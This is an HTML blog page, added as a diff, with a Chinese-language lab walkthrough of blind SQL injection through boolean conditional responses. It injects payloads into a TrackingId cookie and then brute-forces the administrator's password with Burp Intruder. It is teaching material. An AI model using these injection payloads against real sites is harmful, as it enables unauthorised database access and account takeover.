@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Blind SQL injection with conditional responses什么是SQL盲注我的理解： 普通存在SQL注入漏洞的web application，进行的SQL操作返回的结果都能返回到页面上。 如我用  SELECT version FROM v$instance  ，就可以显示version在页面上   但是！ *Blind SQL injection arises">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://h01iday.github.io/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Blind SQL injection with conditional responses什么是SQL盲注我的理解： 普通存在SQL注入漏洞的web application，进行的SQL操作返回的结果都能返回到页面上。 如我用  SELECT version FROM v$instance  ，就可以显示version在页面上   但是！ *Blind SQL injection arises">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/version.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/爆破密码.png">
+<meta property="article:published_time" content="2021-08-12T01:16:58.343Z">
+<meta property="article:modified_time" content="2021-08-12T03:07:17.605Z">
+<meta property="article:author" content="H01iday">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/blog/H01iday/source/_posts/pics/version.png">
+
+
+<link rel="canonical" href="https://h01iday.github.io/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://h01iday.github.io/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/","path":"2021/08/12/SQL injection-Blind with conditional responses/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Blind-SQL-injection-with-conditional-responses"><span class="nav-number">1.</span> <span class="nav-text">Blind SQL injection with conditional responses</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.0.1.</span> <span class="nav-text">什么是SQL盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#triggering-conditional-responses%EF%BC%88lab1%EF%BC%89"><span class="nav-number">1.0.2.</span> <span class="nav-text">triggering conditional responses（lab1）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">题目说明：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%EF%BC%9A"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">目标：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">过程：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">H01iday</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="H01iday">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-08-12 09:16:58 / Modified: 11:07:17" itemprop="dateCreated datePublished" datetime="2021-08-12T09:16:58+08:00">2021-08-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a>Blind SQL injection with conditional responses</h2><h4 id="什么是SQL盲注"><a href="#什么是SQL盲注" class="headerlink" title="什么是SQL盲注"></a>什么是SQL盲注</h4><p>我的理解：</p>
+<p>普通存在SQL注入漏洞的web application，进行的SQL操作返回的结果都能返回到页面上。</p>
+<p>如我用  SELECT version FROM v$instance  ，就可以显示version在页面上</p>
+<img src="D:\blog\H01iday\source\_posts\pics\version.png" style="zoom:60%;" />
+
+<p>但是！</p>
+<p>*<em>Blind SQL injection arises when an application is vulnerable to SQL injection, but <em>==its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors==</em>.</em>*</p>
+<p>所以SQL盲注就是，你对数据库进行任何操作的结果，都不会包含在HTTP响应报文里</p>
+<p>则你无法通过像UNION attack那样的方法，将想要的信息通过SQL语句，写到HTTP报文中，并显示在页面。</p>
+<p>既然无法通过HTTP响应报文得到想要的信息，那应该怎么办呢？</p>
+<h4 id="triggering-conditional-responses（lab1）"><a href="#triggering-conditional-responses（lab1）" class="headerlink" title="triggering conditional responses（lab1）"></a>triggering conditional responses（lab1）</h4><h5 id="题目说明："><a href="#题目说明：" class="headerlink" title="题目说明："></a>题目说明：</h5><p>该网页通过cookies来跟踪用户使用信息。</p>
+<p>当用户发送向该网页的请求包含：<code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4‘</code></p>
+<p>服务器会执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId <span class="operator">=</span> <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行结果不会写入HTTP响应报文中。</p>
+<p>但是如果成功执行了，即如果检测到对应cookie的信息，则会显示<code>Welcome back</code>的信息；反之，则不会；</p>
+<h5 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h5><p> log in as the <code>administrator</code> user</p>
+<h5 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h5><ol>
+<li><p>进入网页，proxy截取http请求报文，发送至Repeater，并找到TrackingId</p>
+</li>
+<li><p>添加<code>&#39;AND+&#39;1&#39;=&#39;1</code>，send，查看response是否存在’Welcome back‘字样</p>
+<p>发现存在；【下面每一步都是通过看response是否存在welcome back来进行判断】</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND+&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>![welcome back](D:\blog\H01iday\source_posts\pics\welcome back.png)</p>
+</li>
+<li><p>添加<code>&#39;AND+&#39;1&#39;=&#39;2</code>，send，查看response是否存在’Welcome back‘字样</p>
+<p>发现不存在</p>
+<p>【通过2-3两步试验我们可以知道，我们可以通过这个地方测试一个boolean条件的正确性】</p>
+</li>
+<li><p>可以验证存在表名为users的表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND (select &#x27;</span>a<span class="string">&#x27; from users limit 1) = &#x27;</span>a;</span><br></pre></td></tr></table></figure>
+
+<p>注意：1.limit 1代表只选取前一行。即便有多行符合条件，只选取前一行。这样做的原因是，如果存在多行都有’a‘,那么它返回结果也是若干行的’a’,则无法=’a’;</p>
+<p>​            2.不一定要选取a，但选取的内容一定要是users表中存在的，一个不行可以多试验几个（其实就是猜）</p>
+</li>
+<li><p>验证存在administrator这个用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND (select &#x27;</span>a<span class="string">&#x27; from users where username = &#x27;</span>administrator<span class="string">&#x27;) = &#x27;</span>a;</span><br></pre></td></tr></table></figure></li>
+<li><p>验证存在password列，且administrator用户密码长度超过1</p>
+</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND (select &#x27;</span>a<span class="string">&#x27; from users where username = &#x27;</span>administrator<span class="string">&#x27; AND length(password)&gt;1) = &#x27;</span>a;</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><p>发送到Intruder。1作为变量；payload type改为Numbers；payload Options From1 To 40 Step:1；Grep-Match先Clear原有内容，再添加“Welcome back”；start attack；</p>
+<p>结果发现密码长度为20</p>
+</li>
+<li><p>回到Intruder positions页面；attack type：Cluster bomb；变量1payload options： 1-20；变量2payload options：a-z0-9；start attack；即可获得20位的password</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\爆破密码.png" alt="爆破密码"></p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">简单理解：其实SQL盲注就是，你通过SQL语句问server，它不会给你答案。</span><br><span class="line">		但是你可以通过特定信息知道server是否正确执行了某些SQL语句。</span><br><span class="line">		例如，我这里只要看到&#x27;welcome back&#x27;我就知道server正确执行了那条语句。</span><br><span class="line">		所以就是，你可以猜，然后server会告诉你对不对。</span><br><span class="line">		如果你猜对了，就&#x27;welcome back&#x27;,否则，不会返回。</span><br><span class="line">		其它SQL注入是问答题。SQL盲注是是非题。</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/08/11/SQL%20injection-Examining%20the%20database/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">H01iday</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
